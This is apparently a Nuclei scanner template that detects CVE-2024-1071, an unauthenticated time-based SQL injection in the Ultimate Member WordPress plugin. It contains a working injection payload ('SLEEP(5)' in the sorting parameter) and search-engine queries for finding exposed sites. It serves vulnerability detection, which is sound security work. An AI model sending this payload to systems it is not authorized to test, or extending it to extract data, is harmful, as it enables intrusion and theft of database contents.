http:
- extractors:
  - group: 1
    internal: true
    name: nonce
    part: body
    regex:
    - '"nonce":"([0-9a-z]+)"'
    type: regex
  host-redirects: true
  matchers:
  - condition: and
    dsl:
    - duration_2>=5
    - status_code_2 == 200
    - contains_all(body_2, "current_page", "total_pages")
    type: dsl
  raw:
  - 'GET /?p=1 HTTP/1.1

    Host: {{Hostname}}

    '
  - '@timeout: 10s

    POST /wp-admin/admin-ajax.php?action=um_get_members HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    directory_id=b9238&sorting=user_login,SLEEP(5)&nonce={{nonce}}

    '
id: CVE-2024-1071
info:
  author: DhiyaneshDK,iamnooob
  classification:
    cve-id: CVE-2024-1071
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-89
    epss-percentile: 0.24988
    epss-score: 0.00063
  description: "The Ultimate Member - User Profile, Registration, Login, Member Directory,\
    \ Content Restriction & Membership Plugin plugin for WordPress is vulnerable to\
    \ SQL Injection via the \u2018sorting\u2019 parameter in versions 2.1.3 to 2.8.2\
    \ due to insufficient escaping on the user supplied parameter and lack of sufficient\
    \ preparation on the existing SQL query. This makes it possible for unauthenticated\
    \ attackers to append additional SQL queries into already existing queries that\
    \ can be used to extract sensitive information from the database.\n"
  metadata:
    fofa-query: body="/wp-content/plugins/ultimate-member"
    framework: wordpress
    max-request: 2
    publicwww-query: /wp-content/plugins/ultimate-member/
    verified: true
    zoomeye-query: app:"WordPress Ultimate Member Plugin"
  name: "WordPress Ultimate Member 2.1.3 - 2.8.2 \u2013 SQL Injection"
  reference:
  - https://www.wordfence.com/blog/2024/02/2063-bounty-awarded-for-unauthenticated-sql-injection-vulnerability-patched-in-ultimate-member-wordpress-plugin/
  - https://securityonline.info/cve-2024-1071-wordpress-ultimate-member-plugin-under-active-attack/
  - https://plugins.trac.wordpress.org/browser/ultimate-member/tags/2.8.2/includes/core/class-member-directory-meta.php?rev=3022076
  - https://plugins.trac.wordpress.org/browser/ultimate-member/tags/2.8.2/includes/core/class-member-directory-meta.php?rev=3022076#L666
  - https://plugins.trac.wordpress.org/browser/ultimate-member/tags/2.8.2/includes/core/class-member-directory-meta.php?rev=3022076#L858
  remediation: Fixed in 2.8.3
  severity: critical
  tags: cve,cve2024,ultimate-member,wpscan,wordpress,wp-plugin
